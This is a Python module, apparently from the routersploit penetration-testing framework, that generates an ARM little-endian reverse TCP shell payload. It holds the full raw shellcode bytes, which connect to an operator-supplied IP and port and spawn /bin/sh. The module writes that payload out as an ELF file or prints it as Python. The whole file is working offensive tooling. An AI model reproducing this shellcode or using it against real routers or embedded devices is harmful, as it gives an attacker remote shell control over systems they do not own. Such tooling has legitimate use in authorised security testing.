from routersploit import (
    exploits,
    armle,
    validators,
    print_success,
    print_status,
    print_error,
    print_info,
    random_text
)


class Exploit(exploits.Exploit, armle.Armle):
    __info__ = {
        'name': 'ARMLE Reverse TCP',
        'authors': [
        ],
        'description': '', 
        'references': [
        ],
    }

    target = exploits.Option('', 'Reverse IP', validators=validators.ipv4)
    port = exploits.Option(5555, 'Bind port', validators=validators.integer)

    output = exploits.Option('python', 'Output type: elf/python')
    filepath = exploits.Option('', 'Output file to write (only for elf type)') 

    def __init__(self):
        self.filepath = "/tmp/{}".format(random_text(8))

    def run(self):
        print_status("Generating ARMLE Reverse TCP payload")
        print_status("Reverse IP: {}".format(self.target))
        print_status("Reverse Port: {}".format(self.port))

        self.generate(self.target, self.port)

        if self.output == "elf":
            with open(self.filepath, 'w+') as f:
                print_status("Building ELF payload")
                content = self.generate_elf()

                print_success("Saving file {}".format(self.filepath))
                f.write(content)

        elif self.output == "python":
            print_success("Building payload for python:")
            content = self.generate_python()
            print_info(content)

    def generate(self, reverse_ip, reverse_port):
        reverse_ip = self.convert_ip(reverse_ip)
        reverse_port = self.convert_port(reverse_port)

        self.payload = (
            "\x01\x10\x8F\xE2" +
            "\x11\xFF\x2F\xE1" +
            "\x02\x20\x01\x21" +
            "\x92\x1A\x0F\x02" +
            "\x19\x37\x01\xDF" +
            "\x06\x1C\x08\xA1" +
            "\x10\x22\x02\x37" +
            "\x01\xDF\x3F\x27" +
            "\x02\x21\x30\x1c" +
            "\x01\xdf\x01\x39" +
            "\xFB\xD5\x05\xA0" +
            "\x92\x1a\x05\xb4" +
            "\x69\x46\x0b\x27" +
            "\x01\xDF\xC0\x46" +
            "\x02\x00" + reverse_port +     # "\x12\x34" struct sockaddr and port
            reverse_ip +                    # reverse ip address
            "\x2f\x62\x69\x6e" +            # /bin
            "\x2f\x73\x68\x00"              # /sh\0
        )
